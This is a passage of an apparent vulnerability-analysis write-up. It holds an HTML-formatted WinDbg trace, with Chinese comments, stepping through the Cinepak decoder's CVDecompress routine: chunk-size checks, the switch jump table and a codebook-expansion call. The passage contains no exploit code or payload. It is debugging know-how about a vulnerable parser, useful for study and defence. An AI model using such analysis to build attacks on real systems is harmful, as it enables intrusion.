class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x149</span>:</span><br><span class="line">73b722f7 8a7101          <span class="keyword">mov</span>     <span class="number">dh</span>,<span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">ecx</span>+<span class="number">1</span>]        <span class="built_in">ds</span>:<span class="number">0023</span>:00ba690f=<span class="number">00</span> <span class="comment">; dh = 0x00,第1个CVID Chunk ID的低位字节</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b722fa <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x14c</span>:</span><br><span class="line">73b722fa 8a5102          <span class="keyword">mov</span>     <span class="built_in">dl</span>,<span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">ecx</span>+<span class="number">2</span>]        <span class="built_in">ds</span>:<span class="number">0023</span>:00ba6910=<span class="number">00</span> <span class="comment">; dl = 0x00,Size of chunk data的高位字节</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b722fd <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x14f</span>:</span><br><span class="line">73b722fd c1e208          <span class="keyword">shl</span>     <span class="built_in">edx</span>,<span class="number">8</span>                                          <span class="comment">; edx = 0x00000000,左移8位</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b72300 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x152</span>:</span><br><span class="line">73b72300 0bd0            <span class="keyword">or</span>      <span class="built_in">edx</span>,<span class="built_in">eax</span>                                        <span class="comment">; 以大端读取Size of chunk data</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b72302 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x154</span>:</span><br><span class="line">73b72302 <span class="number">395508</span>          <span class="keyword">cmp</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">8</span>],<span class="built_in">edx</span> <span class="built_in">ss</span>:<span class="number">0023</span>:025afd38=<span class="number">00000004</span> <span class="comment">; 判断Size of strip data减去Strip Header大小后的数据大小是否小于Size of chunk data</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b72305 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x157</span>:</span><br><span class="line">73b72305 8955e0          <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">20h</span>],<span class="built_in">edx</span> <span class="built_in">ss</span>:<span class="number">0023</span>:025afd10=<span class="number">00000000</span> <span class="comment">; [ebp-20h] = edx = 0x00000000,Size of chunk data</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b72308 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x15a</span>:</span><br><span class="line">73b72308 0f82ab000000    <span class="keyword">jb</span>      iccvid!CVDecompress+<span class="number">0x20b</span> (73b723b9)    [br=<span class="number">0</span>] <span class="comment">; 小于则跳转，这里不跳转</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b7230e <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x160</span>:</span><br><span class="line">73b7230e 0fb601          <span class="keyword">movzx</span>   <span class="built_in">eax</span>,<span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">ecx</span>]         <span class="built_in">ds</span>:<span class="number">0023</span>:00ba690e=<span class="number">20</span> <span class="comment">; eax = 0x00000020,第1个CVID Chunk ID的高位字节</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000020</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b72311 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x163</span>:</span><br><span class="line">73b72311 83c0e0          <span class="keyword">add</span>     <span class="built_in">eax</span>,<span class="number">0FFFFFFE0h</span>     <span class="comment">; switch cases,0x20+0xFFFFFFE0=0x0,0x32+0xFFFFFFE0=0x12</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b72314 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe cy</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000247</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x166</span>:</span><br><span class="line">73b72314 83f812          <span class="keyword">cmp</span>     <span class="built_in">eax</span>,<span class="number">12h</span>                                        <span class="comment">; eax&gt;0x12,则第1个CVID Chunk ID的高位字节大于0x32</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b72317 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei ng nz ac pe cy</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000297</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x169</span>:</span><br><span class="line">73b72317 <span class="number">777d</span>            <span class="keyword">ja</span>      iccvid!CVDecompress+<span class="number">0x1e8</span> (73b72396)    [br=<span class="number">0</span>] <span class="comment">; 大于则跳转，default case，这里不跳转</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b72319 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei ng nz ac pe cy</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000297</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x16b</span>:</span><br><span class="line">73b72319 0fb6801024b773  <span class="keyword">movzx</span>   <span class="built_in">eax</span>,<span class="built_in">byte</span> <span class="built_in">ptr</span> iccvid!CVDecompress+<span class="number">0x262</span> (73b72410)[<span class="built_in">eax</span>] <span class="built_in">ds</span>:<span class="number">0023</span>:73b72410=<span class="number">00</span> <span class="comment">; indirect table for switch statement</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b72320 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei ng nz ac pe cy</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000297</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x172</span>:</span><br><span class="line">73b72320 ff2485f823b773  <span class="keyword">jmp</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> iccvid!CVDecompress+<span class="number">0x24a</span> (73b723f8)[<span class="built_in">eax</span>*<span class="number">4</span>] <span class="built_in">ds</span>:<span class="number">0023</span>:73b723f8=73b72327 <span class="comment">; jump table for switch statement</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b72327 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei ng nz ac pe cy</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000297</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x179</span>:</span><br><span class="line">73b72327 ff7330          <span class="keyword">push</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebx</span>+<span class="number">30h</span>]  <span class="built_in">ds</span>:<span class="number">0023</span>:001535e0=<span class="number">00000000</span> <span class="comment">; arg4,ebx = a1 = 0x001535b0</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b7232a <span class="built_in">esp</span>=025afd00 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei ng nz ac pe cy</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000297</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x17c</span>: </span><br><span class="line">73b7232a ff7334          <span class="keyword">push</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebx</span>+<span class="number">34h</span>]  <span class="built_in">ds</span>:<span class="number">0023</span>:001535e4=001595f8 <span class="comment">; arg3,ebx = a1 = 0x001535b0,0x001595f8为堆块数据区域尾指针</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b7232d <span class="built_in">esp</span>=025afcfc <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei ng nz ac pe cy</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000297</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x17f</span>:</span><br><span class="line">73b7232d ff7338          <span class="keyword">push</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebx</span>+<span class="number">38h</span>]  <span class="built_in">ds</span>:<span class="number">0023</span>:001535e8=001535f8 <span class="comment">; arg2,ebx = a1 = 0x001535b0,0x001535f8为堆块数据区域首指针</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b72330 <span class="built_in">esp</span>=025afcf8 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei ng nz ac pe cy</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000297</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x182</span>:</span><br><span class="line">73b72330 <span class="number">57</span>              <span class="keyword">push</span>    <span class="built_in">edi</span>                                            <span class="comment">; arg1,edi = 0x00ba690e,指向第1个CVID Chunk ID</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b72331 <span class="built_in">esp</span>=025afcf4 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei ng nz ac pe cy</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000297</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x183</span>:</span><br><span class="line">73b72331 ff13            <span class="keyword">call</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebx</span>]      <span class="built_in">ds</span>:<span class="number">0023</span>:001535b0=&#123;iccvid!ExpandCodeBook32 (73b79f3b)&#125; <span class="comment">; 展开Codebooks</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000000</span> <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b72333 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x185</span>:</span><br><span class="line">73b72333 eb61            <span class="keyword">jmp</span>     iccvid!CVDecompress+<span class="number">0x1e8</span> (73b72396)           <span class="comment">; switch代码块之后的代码块</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000000</span> <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b72396 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x1e8</span>:</span><br><span class="line">73b72396 8b55e0          <span class="keyword">mov</span>     <span class="built_in">edx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">20h</span>] <span class="built_in">ss</span>:<span class="number">0023</span>:025afd10=<span class="number">00000000</span> <span class="comment">; edx = [ebp-20h] = 0x00000000,Size of chunk data</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000000</span> <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b72399 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x1eb</span>:</span><br><span class="line">73b72399 8b4de8          <span class="keyword">mov</span>     <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">18h</span>] <span class="built_in">ss</span>:<span class="number">0023</span>:025afd18=00ba690e <span class="comment">; ecx = [ebp-18h] = 0x00ba690e,指向第1个CVID Chunk ID</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b7239c <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x1ee</span>:</span><br><span class="line">73b7239c 33c0            <span class="keyword">xor</span>     <span class="built_in">eax</span>,<span class="built_in">eax</span>                                        <span class="comment">; eax = eax^eax = 0x00000000</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b7239e <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x1f0</span>:</span><br><span class="line">73b7239e 03ca            <span class="keyword">add</span>     <span class="built_in">ecx</span>,<span class="built_in">edx</span>                                        <span class="comment">; ecx指向第1个CVID Chunk ID,edx为Size of chunk data</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b723a0 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x1f2</span>:</span><br><span class="line">73b723a0 <span class="number">40</span>              <span class="keyword">inc</span>     <span class="built_in">eax</span>                                            <span class="comment">; eax = eax+1 = 0x1</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000001</span> <span class="built_in">ebx</span>=001535b0 <span 